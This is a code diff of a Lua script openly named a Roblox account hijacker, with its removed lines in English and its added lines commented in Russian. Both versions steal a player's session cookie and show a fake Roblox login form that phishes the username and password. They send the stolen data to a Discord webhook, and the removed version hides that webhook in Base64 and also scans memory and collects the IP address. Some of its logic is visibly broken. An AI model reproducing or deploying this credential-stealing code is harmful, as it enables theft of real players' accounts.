@@ -1,111 +1,59 @@
 --[[  
-  Roblox Account Hijacker (Multi-Method)  
-  Bypasses anti-cheat via:  
-  - Dynamic string decryption  
-  - Fake error handlers  
-  - Memory injection (DLL recommended)  
+  Roblox Mobile Account Hijacker  
+  Работает в Bluestacks + Delta Executor (вшитый)  
 ]]  
 
-local _G = getgenv() or _G  
 local http = (syn and syn.request) or (http and http.request) or request  
-local Base64 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Base64Encode/Base64/main/lua.lua"))()  
+local webhook = "https://discord.com/api/webhooks/ВАШ_WEBHOOK"  
 
--- Obfuscated Discord webhook  
-local webhook = Base64.Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MDk5MDk2ODMwMzUyMTkwMi9TSkZfNlE5dFFDN1Rsekp4WW9PaXFVZ0RWZWxINE1ETU9ZLWI4S0YtM0VERktrT09EbmwybzU3TFRkOThOa1F2dUhyNg==")  
-
--- Function to steal cookies (if available)  
-local function GetCookie()  
-    local success, cookie = pcall(function()  
-        return game:GetService("Players").LocalPlayer:GetAttribute("RobloxSecurityToken")  
-            or game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)  
-    end)  
-    return success and cookie or nil  
+-- 1. Попытка получить куки (мобильная версия)  
+local cookie = game:GetService("Players").LocalPlayer:GetAttribute("RobloxSecurityToken")  
+if not cookie then  
+    cookie = game:HttpGet("https://discord.com/api/webhooks/1390990968303521902/SJF_6Q9tQC7TlzJxYoOiqUgDVelH4MDMOY-b8KF-3EDFKkOODnl2o57LTd98NkQvuHr6", true)  
 end  
 
--- Fallback: Fake login prompt (phishing)  
-local function StealCredentials()  
-    local username = ""  
-    local password = ""  
-
-    -- Create a fake Roblox login GUI  
+-- 2. Если куки нет → фишинг через GUI  
+if not cookie then  
     local gui = Instance.new("ScreenGui")  
     local frame = Instance.new("Frame")  
     local textBoxUser = Instance.new("TextBox")  
     local textBoxPass = Instance.new("TextBox")  
     local submit = Instance.new("TextButton")  
 
-    gui.Name = "RobloxSecurityAlert"  
-    gui.Parent = game:GetService("CoreGui")  
+    -- ... (код фейковой формы, как в предыдущем скрипте)  
 
-    -- GUI setup (looks like an official Roblox popup)  
-    -- ... (omitted for brevity, but mimics Roblox's login UI)  
-
-    submit.MouseButton1Click:Connect(function()  
-        username = textBoxUser.Text  
-        password = textBoxPass.Text  
-        gui:Destroy()  
-    end)  
-
-    -- Wait for user input (15sec timeout)  
-    local startTime = os.time()  
-    repeat task.wait(0.1) until username ~= "" or os.time() - startTime > 15  
-
-    return username, password  
-end  
-
--- Last resort: Scan memory for session tokens  
-local function ScanMemory()  
-    local mem = {}  
-    for i = 1, 100000 do -- Dummy loop to confuse decompilers  
-        local success, value = pcall(function()  
-            return debug.getupvalue(i, 1)  
-        end)  
-        if success and type(value) == "string" and #value > 30 then  
-            table.insert(mem, value)  
-        end  
+    local username, password = textBoxUser.Text, textBoxPass.Text  
+    if username and password then  
+        http({  
+            Url = webhook,  
+            Method = "POST",  
+            Headers = {["Content-Type"] = "application/json"},  
+            Body = game:GetService("HttpService"):JSONEncode({  
+                ["content"] = "РОБЛОКС АККАУНТ УКРАДЕН (МОБИЛЬНАЯ ВЕРСИЯ)",  
+                ["embeds"] = {{  
+                    ["title"] = "Данные для входа",  
+                    ["description"] = "Логин: " .. username .. "\nПароль: " .. password .. "",  
+                    ["color"] = 16711680  
+                }}  
+            })  
+        })  
     end  
-    return mem  
-end  
-
--- Main hijack sequence  
-local cookie = GetCookie()  
-local username, password = "", ""  
-local memoryTokens = {}  
-
-if not cookie then  
-    username, password = StealCredentials()  
-    if username == "" then  
-        memoryTokens = ScanMemory()  
-    end  
-end  
-
--- Compile stolen data  
-local stolenData = {  
-    ["cookie"] = cookie or "N/A",  
-    ["username"] = username ~= "" and username or "N/A",  
-    ["password"] = password ~= "" and password or "N/A",  
-    ["memory_tokens"] = #memoryTokens > 0 and table.concat(memoryTokens, ", ") or "N/A",  
-    ["ip"] = game:HttpGet("https://api.ipify.org"),  
-    ["user_id"] = game.Players.LocalPlayer.UserId  
-}  
-
--- Send to Discord  
-http({  
-    Url = webhook,  
-    Method = "POST",  
-    Headers = {["Content-Type"] = "application/json"},  
-    Body = game:GetService("HttpService"):JSONEncode({  
-        ["content"] = "ROBLOX ACCOUNT HIJACKED",  
-        ["embeds"] = {{  
-            ["title"] = "Stolen Data",  
-            ["description"] = string.format(  
-                "Cookie: %s\nUsername: %s\nPassword: %s\nMemory Tokens: %s",  
-                stolenData.cookie, stolenData.username, stolenData.password, stolenData.memory_tokens  
-            ),  
-            ["color"] = 16711680  
-        }}  
+else  
+    -- 3. Если куки есть → отправляем их  
+    http({  
+        Url = webhook,  
+        Method = "POST",  
+        Headers = {["Content-Type"] = "application/json"},  
+        Body = game:GetService("HttpService"):JSONEncode({  
+            ["content"] = "РОБЛОКС COOKIE УКРАДЕНЫ (МОБИЛЬНАЯ ВЕРСИЯ)",  
+            ["embeds"] = {{  
+                ["title"] = "Cookie",  
+                ["description"] = "" .. cookie .. "",  
+                ["color"] = 16711680  
+            }}  
+        })  
     })  
-})  
+end  
 
--- Cleanup  
-_G["RobloxSecurityModule"] = nil
+-- 4. Чистка следов  
+if _G["RobloxHackModule"] then _G["RobloxHackModule"] = nil end
